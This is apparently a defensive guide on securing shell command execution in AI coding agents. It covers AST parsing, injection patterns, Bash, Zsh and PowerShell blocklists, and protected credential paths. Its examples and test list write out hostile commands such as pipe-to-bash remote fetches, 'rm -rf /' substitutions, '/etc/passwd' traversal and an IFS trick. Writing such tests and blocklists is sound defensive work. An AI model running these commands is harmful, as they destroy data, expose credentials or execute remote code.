# Agent Security: Command Execution

Best practices for securing shell and command execution in autonomous AI agent systems. Derived from production analysis of agentic coding tools handling millions of shell commands daily.

*Last updated: 2026-03-31*

---

## Why This Matters

An AI agent with shell access is the most powerful — and most dangerous — tool in the stack. A single unsanitized command can exfiltrate data, modify system files, or pivot into your network. The challenge: agents need shell access to be useful, but giving them unrestricted execution is a security disaster.

This document covers the multi-layer defense approach used in production agentic systems that have scaled to massive daily command volumes without a single known shell escape.

---

## 1. Multi-Layer Validation Pipeline

Never rely on a single check. Production systems use 4+ independent validation layers, each catching different attack classes:

| Layer | What It Catches | Implementation |
|-------|----------------|----------------|
| **AST Parsing** | Structural attacks (nested commands, pipes, redirects) | Tree-sitter or equivalent shell parser |
| **Pattern Detection** | Known dangerous sequences (command substitution, IFS injection) | Regex against parsed tokens |
| **Semantic Classification** | Intent mismatch (write command when read expected) | Command categorization engine |
| **Unicode Normalization** | Invisible character injection, homograph attacks | NFKC normalization + character class stripping |

**Key Insight:** Each layer is independent. Bypassing one doesn't help with the others. This is defense in depth applied to command parsing.

### Pipeline Order

```
Raw Input
  -> Unicode Normalization (strip invisible chars)
  -> AST Parse (build syntax tree)
  -> Quote Context Extraction (identify quoted vs unquoted regions)
  -> Token Decomposition (split by operators: &&, ||, ;, |)
  -> Per-Segment Validation (each command segment checked independently)
  -> Semantic Classification (read vs write vs dangerous)
  -> Permission Check (does the agent have authorization?)
  -> Execute (or reject)
```

---

## 2. AST-Based Parsing (Not Regex Alone)

**The mistake everyone makes:** Regex-only command validation. Shell syntax is context-sensitive — the same characters mean different things inside quotes, heredocs, command substitutions, and parameter expansions. Regex cannot handle this reliably.

**What works:** Use a proper shell parser to build an abstract syntax tree, then validate the tree.

### Why AST Parsing Matters

| Input | Regex Sees | AST Sees |
|-------|-----------|----------|
| `echo "$(rm -rf /)"` | String with parens | Command substitution containing `rm -rf /` |
| `echo '$(rm -rf /)'` | Same pattern | Literal string (single-quoted, no expansion) |
| `grep -r "pattern" .` | Flags and args | Read-only search command |
| `grep -r "pattern" . ; rm -rf /` | Same start | Two commands: search + destructive delete |

### Quote Context Awareness

Extract and track quote contexts separately:
- **Single quotes** (`'...'`): No expansion, literal content — generally safe
- **Double quotes** (`"..."`): Variable expansion and command substitution possible — must validate inner content
- **Unquoted**: Full shell expansion — highest risk, validate everything
- **ANSI-C quotes** (`$'...'`): Escape sequences interpreted — flag for inspection

---

## 3. Command Injection Prevention

### 3.1 Command Substitution

Block or flag these patterns in unquoted and double-quoted contexts:

| Pattern | Attack Vector |
|---------|--------------|
| `$(...)` | POSIX command substitution |
| `` `...` `` | Legacy backtick substitution |
| `<(...)` | Process substitution (input) |
| `>(...)` | Process substitution (output) |
| `${...}` | Parameter expansion (can execute via `${!var}` indirect refs) |

**Implementation:** Detect these at the AST level, not with regex. A regex for `$(` will false-positive on `echo "costs $(5)"` in a literal string context.

### 3.2 IFS Injection

The `IFS` (Internal Field Separator) variable controls word splitting. Modifying it can change how commands are parsed:

```bash
# Attack: change IFS so "safe" command becomes dangerous
IFS=/ cmd=rmusrbin; $cmd  # Becomes: rm usr bin
```

**Mitigation:** Flag any attempt to set `IFS` in agent commands. There is virtually no legitimate reason for an agent to modify IFS.

### 3.3 Shell Metacharacter Injection

Watch for these in command arguments:

| Character | Risk |
|-----------|------|
| `;` | Command chaining |
| `&&` / `\|\|` | Conditional execution |
| `\|` | Pipe to another command |
| `>` / `>>` | File write/append redirect |
| `<` | File read redirect |
| `\n` (newline) | Command separator in some shells |
| `\0` (null byte) | String terminator manipulation |

**Implementation:** Decompose commands at operator boundaries and validate each segment independently.

### 3.4 Escaped Whitespace Injection

Backslash-escaped whitespace can join what appears to be separate tokens:

```bash
# Looks like: echo hello world
# Actually: single argument "echo\ dangerous\ command"
echo\ dangerous\ command
```

**Mitigation:** Detect escaped whitespace in command names and flag for review.

---

## 4. Shell-Specific Considerations

### 4.1 Bash-Specific

| Feature | Risk | Mitigation |
|---------|------|------------|
| Brace expansion `{a,b,c}` | Can generate dangerous paths | Context-aware detection (ignore inside quotes) |
| History expansion `!` | Can replay previous commands | Disable in agent shell sessions |
| Process substitution `<()` | Hidden command execution | Block at AST level |
| Heredocs `<<EOF` | Multi-line command injection | Parse heredoc boundaries |

### 4.2 Zsh-Specific

Zsh has additional dangerous built-ins that Bash doesn't:

| Command | Risk |
|---------|------|
| `zmodload` | Load kernel modules |
| `zpty` | Pseudo-terminal control |
| `ztcp` / `zsocket` | Raw network access |
| `sysopen` | Low-level file descriptor access |
| `emulate` | Change shell emulation mode |
| `=cmd` (equals expansion) | Path lookup bypass |

**Mitigation:** Maintain a blocklist of shell-specific dangerous commands. Update it as shells add features.

### 4.3 PowerShell-Specific

PowerShell requires a different approach — cmdlet-based rather than command-based:

| Category | Blocked Cmdlets | Why |
|----------|----------------|-----|
| Code execution | `Invoke-Expression`, `Invoke-Command`, `Add-Type` | Arbitrary code execution |
| Module loading | `Import-Module`, `Install-Module` | Can load malicious modules |
| Process creation | `Start-Process`, `Start-Job` | Spawn unmonitored processes |
| Network access | `Invoke-WebRequest`, `Invoke-RestMethod` | Uncontrolled network calls |
| Alias manipulation | `Set-Alias`, `Set-Variable` | Can alias safe commands to dangerous ones |
| WMI/CIM | `Invoke-WmiMethod`, `Invoke-CimMethod` | System-level access |

**Implementation:** Validate cmdlet names with argument inspection. Some cmdlets are safe with certain arguments but dangerous with others (e.g., `ForEach-Object` with `-ScriptBlock` parameter).

---

## 5. Semantic Command Classification

Not all commands are equal. Classify commands by intent:

### Read-Only Commands (Generally Safe)

```
cat, head, tail, less, more, wc, file, stat
ls, dir, find, locate, which, where
grep, rg, ag, ack
git status, git log, git diff, git show
ps, top, df, du, free, uname
```

### Search Commands (Safe, May Reveal Info)

```
find, locate, fd
grep -r, rg, ag
git grep
```

### Write Commands (Require Permission)

```
mv, cp, rm, mkdir, rmdir, touch
chmod, chown, chgrp
git add, git commit, git push
sed -i, tee, dd
```

### Dangerous Commands (Block or Escalate)

```
curl | sh, wget | sh    # Remote code execution
eval, exec, source      # Dynamic execution
sudo, su, doas          # Privilege escalation
kill, killall, pkill    # Process termination
mkfs, dd if=/dev/zero   # Disk destruction
iptables, ufw           # Firewall modification
```

### Semantically Neutral (Skip in Pipeline Analysis)

```
echo, printf            # Output only
true, false             # No-ops
test, [                 # Conditionals only
```

**Key Insight:** Classify the *base command* of each pipeline segment, not just the first command. `ls | rm` has a read-only first segment but a destructive second segment.

---

## 6. Cross-Segment Analysis

Commands chained with `&&`, `||`, `;`, or `|` must be analyzed as a unit:

### Pattern: Directory Change + Dangerous Action

```bash
cd /tmp && rm -rf *          # Safe directory, dangerous action
cd ~/projects && git push -f  # Legitimate directory, needs permission
```

**Mitigation:** Track directory context across segments. A `cd` in one segment changes the working directory for subsequent segments.

### Pattern: Pipe to Execution

```bash
curl https://example.com/script.sh | bash   # Remote code execution
cat file.txt | sh                             # File-to-execution
echo "rm -rf /" | bash                        # String-to-execution
```

**Mitigation:** Flag any pipe to `bash`, `sh`, `zsh`, `eval`, `exec`, `source`, or `python`.

---

## 7. Path Validation

### Required Checks

1. **Null byte detection:** Reject any path containing `\0` — used to truncate strings in C-based tools
2. **Path traversal:** Detect and resolve `../` sequences via `realpath()` or equivalent
3. **Absolute path enforcement:** Require absolute paths for write operations
4. **Symlink resolution:** Resolve symlinks before checking permissions — a symlink in a safe directory can point to a dangerous one
5. **Home directory expansion:** Handle `~` and `~/` but block `~username` (prevents targeting other users)

### Dangerous Paths to Protect

| Path Pattern | Why |
|-------------|-----|
| `.git/` directory | Repository integrity |
| `.env`, `.env.*` | Credentials and secrets |
| `~/.ssh/` | SSH keys |
| `~/.bashrc`, `~/.zshrc`, `~/.profile` | Shell startup — code execution on next login |
| `~/.gitconfig` | Git configuration tampering |
| `/etc/`, `/usr/`, `/bin/` | System directories |
| `node_modules/.cache/` | Supply chain attack vector |

### Unicode Path Normalization

Apply NFC normalization to all paths before comparison. Different Unicode representations of the same character can bypass string-based path checks:

```
/home/user/file.txt     (NFC)
/home/user/file.txt     (NFD — decomposed, visually identical)
```

---

## 8. Implementation Checklist

### Minimum Viable Security

- [ ] AST-based shell parsing (not regex alone)
- [ ] Command substitution detection and blocking
- [ ] Operator-based command decomposition
- [ ] Base command extraction and classification
- [ ] Null byte rejection in paths
- [ ] Path traversal detection
- [ ] Dangerous command blocklist

### Production-Grade Security

- [ ] All of the above, plus:
- [ ] Quote context tracking (single, double, unquoted)
- [ ] IFS injection detection
- [ ] Shell-specific blocklists (Bash, Zsh, PowerShell)
- [ ] Cross-segment analysis (pipe-to-execution, cd+action)
- [ ] Unicode NFKC normalization on all inputs
- [ ] Invisible character stripping
- [ ] Semantic command classification
- [ ] Symlink resolution before permission checks
- [ ] Escaped whitespace detection
- [ ] Brace expansion context awareness
- [ ] Heredoc boundary parsing
- [ ] Progress reporting for long-running commands
- [ ] Timeout enforcement

---

## 9. Testing Your Command Security

### Attack Vectors to Test

```
# Command substitution
echo $(whoami)
echo `id`

# Process substitution
cat <(whoami)
tee >(cat > /tmp/stolen)

# IFS manipulation
IFS=/ cmd=rmusrbin; $cmd

# Pipe to execution
curl example.com | bash
echo "id" | sh

# Escaped whitespace
echo\ dangerous\ command

# Null byte path
cat /etc/passwd%00.txt

# Path traversal
cat ../../../../etc/passwd

# Unicode homograph
cat /etc/pаsswd  (Cyrillic 'а' instead of Latin 'a')

# Nested substitution
echo $(echo $(whoami))

# Heredoc injection
cat <<EOF
$(whoami)
EOF
```

### Regression Test Categories

1. **True positives:** Known dangerous commands are blocked
2. **True negatives:** Safe commands execute normally
3. **Quote context:** Same pattern behaves differently in different quote contexts
4. **Shell-specific:** Zsh/PowerShell-specific attacks caught
5. **Unicode:** Invisible characters stripped, homographs normalized
6. **Path:** Traversal, symlinks, null bytes all caught
7. **Cross-segment:** Chained commands analyzed as a unit

---

## Related Documents

- [AGENT-SECURITY-NETWORK-AND-INJECTION.md](AGENT-SECURITY-NETWORK-AND-INJECTION.md) — SSRF protection and Unicode injection defense
- [AGENT-PERMISSION-SYSTEM-DESIGN.md](AGENT-PERMISSION-SYSTEM-DESIGN.md) — Permission system that gates command execution
- [AGENT-ERROR-HANDLING-AND-HOOKS.md](AGENT-ERROR-HANDLING-AND-HOOKS.md) — Hook framework for pre/post command validation
